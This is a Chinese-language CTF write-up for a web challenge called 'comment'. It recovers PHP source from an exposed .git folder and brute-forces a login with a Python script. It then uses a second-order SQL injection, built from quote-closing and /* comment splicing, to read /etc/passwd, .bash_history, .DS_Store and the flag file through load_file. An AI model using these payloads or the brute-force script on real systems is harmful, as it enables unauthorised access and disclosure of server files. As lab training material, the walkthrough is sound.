# comment

根目录有.git文件夹，显示403 Forbidden，但是没关系，  
```bash
python git_extract.py http://220.249.52.133:55889/.git/
```
恢复了两个文件，其中一个write_do.php.8ef569是完整的。  


首先要登录网站，提示是zhangweixxx，爆破即可，爆破脚本：  
```python
import requests

url = 'http://220.249.52.133:55889/login.php'

for i in range(0, 1000):
    i = '0' * (3 - len(str(i))) + str(i)
    data = {
        'username': 'zhangwei',
        'password': 'zhangwei' + i   # 000, 001, 002, ... 999
    }   
    result = requests.post(url=url, data=data)
    print(i)
    print('length: ' + str(len(result.text)))   # 观察其长度，长度不一样就是正确密码
```


题目代码：
```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);             # payload: http://220.249.52.133:55889/write_do.php?do=write
    $title = addslashes($_POST['title']);                   #   参数:  category=a', content=(select(load_file('/etc/passwd'))),/*
    $content = addslashes($_POST['content']);       
    $sql = "insert into board                               
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
        $category = mysql_fetch_array($result)['category'];     # 这里没有过滤，把category的内容原样输出
        $content = addslashes($_POST['content']);       # 这里闭合上面的注释符*/，payload: write_do.php?do=comment，参数：bo_id=1&content=*/#
        $sql = "insert into comment
            set category = '$category',                         
                content = '$content',
                bo_id = '$bo_id'";
        $result = mysql_query($sql);                            # 此时这句组合起来的实际sql语句变成insert into comment 
    }                                                           #       set category = a', content=(select(load_file('/etc/passwd'))),/*',
    header("Location: ./comment.php?id=$bo_id");                #       content = '*/#',
    break;                                                      #       bo_id = '1'
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

在/etc/passwd发现home目录是/home/www/，然后查看其.bash_history，`category=a', content=(select(load_file('/home/www/.bash_history'))),/*`，

发现一个.DS_Store文件在/tmp/html/目录下，查看`a', content=(select(hex(load_file('/tmp/html/.DS_Store')))),/*`

解码后发现flag文件flag_8946e1ff1ee3e40f.php，查看`a', content=(select(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*`，得到flag